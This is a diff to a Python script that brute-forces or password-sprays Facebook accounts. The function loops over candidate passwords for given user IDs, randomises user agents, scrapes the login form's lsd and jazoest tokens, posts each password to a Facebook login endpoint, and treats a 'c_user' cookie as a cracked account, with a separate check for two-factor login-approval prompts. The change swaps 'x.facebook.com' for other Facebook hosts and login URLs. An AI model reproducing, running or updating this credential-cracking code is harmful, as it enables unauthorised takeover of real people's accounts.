@@ -1706,7 +1706,7 @@ def freeq(uid,pwx,tl):
         for pw in pwx:
             ua = random.choice(uas)
             Session = requests.Session()
-            free_fb = Session.get('https://x.facebook.com/').text
+            free_fb = Session.get('https://m.facebook.com/').text
             data = {
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -1715,7 +1715,7 @@ def freeq(uid,pwx,tl):
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers ={
-            "Host": "x.facebook.com",
+            "Host": "m.facebook.com",
             "Connection": "keep-alive",
             "Cache-Control": "max-age=0",
             "Upgrade-Insecure-Requests": "1",
@@ -1726,13 +1726,13 @@ def freeq(uid,pwx,tl):
             "Sec-Fetch-Dest": "document",
             "Accept-Encoding": "gzip, deflate, br, zstd",
             "Accept-Language": "en-US,en;q=0.9",
-            "Referer": "https://x.facebook.com/login/device-based/regular/login/",
+            "Referer": "https://m.facebook.com/login/device-based/regular/login/",
             "Sec-CH-UA": '"Chromium";v="119", "Not?A_Brand";v="24"',
             "Sec-CH-UA-Mobile": "?1",
             "Sec-CH-UA-Platform": '"Android"',
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
+            url = "https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
